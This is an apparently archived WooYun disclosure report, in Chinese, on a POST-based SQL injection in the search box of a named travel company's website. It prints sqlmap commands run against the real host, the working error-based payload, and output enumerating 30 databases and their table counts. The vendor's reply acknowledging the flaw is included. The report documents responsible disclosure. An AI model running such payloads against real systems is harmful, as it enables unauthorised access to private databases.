wybug_title: 广州一起飞商旅信息服务有限公司某站存在SQL注入
wybug_detail:
漏洞详情 披露状态：   									2015-04-01：	细节已通知厂商并且等待厂商处理中									2015-04-01：	厂商已经确认，细节仅向厂商公开									2015-04-11：	细节向核心白帽子及相关领域专家公开									2015-04-21：	细节向普通白帽子公开									2015-05-01：	细节向实习白帽子公开									2015-05-16：	细节向公众公开  简要描述： 存在POST搜索型注入 详细说明：  注入点http://service.yiqifei.com/default.aspx页面的搜索框
root@kali:~# sqlmap -r /root/1.txt --technique=E --dbs    sqlmap/1.0-dev-25b2375 - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 18:44:29[18:44:29] [INFO] parsing HTTP request from '/root/1.txt'[18:44:30] [INFO] resuming back-end DBMS 'microsoft sql server' [18:44:35] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: ctl00$ContentPlaceHolder1$Right1$txt_subject    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: __&__EVENTVALIDATION=/wEWAwLUhtaSBALP7rLXCQKH2srXAt3fYwd2JWn1lN/qm2pBp8PnKK0e&ctl00$ContentPlaceHolder1$Right1$txt_subject=12%' AND 3603=CONVERT(INT,(SELECT CHAR(113)+CHAR(114)+CHAR(116)+CHAR(109)+CHAR(113)+(SELECT (CASE WHEN (3603=3603) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(109)+CHAR(118)+CHAR(108)+CHAR(113))) AND '%'='&ctl00$ContentPlaceHolder1$Right1$btn_search=%E9%A9%AC%E4%B8%8A%E6%9F%A5%E8%AF%A2---[18:44:35] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2008 R2 or 7web application technology: ASP.NET, Microsoft IIS 7.5, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2005[18:44:35] [INFO] fetching database names[18:44:35] [INFO] the SQL query used returns 30 entriesavailable databases [30]:[*] ADsDB[*] FenZi[*] JiFeng[*] JiFengState[*] master[*] model[*] msdb[*] NetSNS[*] SecKill[*] SecKillState[*] SecKillTest[*] SkyHunterDB[*] SystemBaseInfo[*] tempdb[*] Topic[*] TuanGou[*] Woquguo[*] WoquguoState[*] YiqifeiBusiness[*] YiqifeiBusinessML[*] YiqifeiBusinessMultiLanguage[*] YiqifeiCom[*] YiqifeiPay[*] YiqifeiPrintPNR[*] YQFAccount[*] YqfBiz[*] YqfBizState[*] YQFCMS[*] Zaoniao[*] ZaoniaoState
   漏洞证明：  表太多，就不一一列出来了
root@kali:~# sqlmap  -r /root/1.txt --technique=E  --tables |grep -v INFO| grep -E 'Database|tables'Database: YiqifeiBusiness[4 tables]Database: YiqifeiBusinessMultiLanguage[10 tables]Database: NetSNS[119 tables]Database: WoquguoState[2 tables]Database: FenZiDatabase: Topic[3 tables]Database: ADsDB[6 tables]Database: YiqifeiBusinessML[7 tables]Database: YiqifeiPrintPNR[3 tables]Database: master[291 tables]| sys.dm_os_memory_cache_hash_tables                || sys.internal_tables                               || sys.syscursortables                               || sys.tables                                        |Database: YiqifeiCom[37 tables]Database: YQFAccount[6 tables]Database: Woquguo[24 tables]Database: SecKillState[2 tables]Database: SkyHunterDB[3 tables]Database: YqfBiz[13 tables]Database: msdb[9 tables]Database: YqfBizState[2 tables]Database: SystemBaseInfo[50 tables]Database: YQFCMS[5 tables]Database: TuanGou[6 tables]Database: YiqifeiPay[5 tables]Database: SecKill[6 tables]Database: SecKillTest[2 tables]Database: ZaoniaoState[2 tables]Database: Zaoniao[28 tables]
   修复方案：  过滤   版权声明：转载请注明来源 路人甲@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-04-01 14:55 厂商回复： 多谢对一起飞的关注，已经安排修复。 最新状态： 暂无
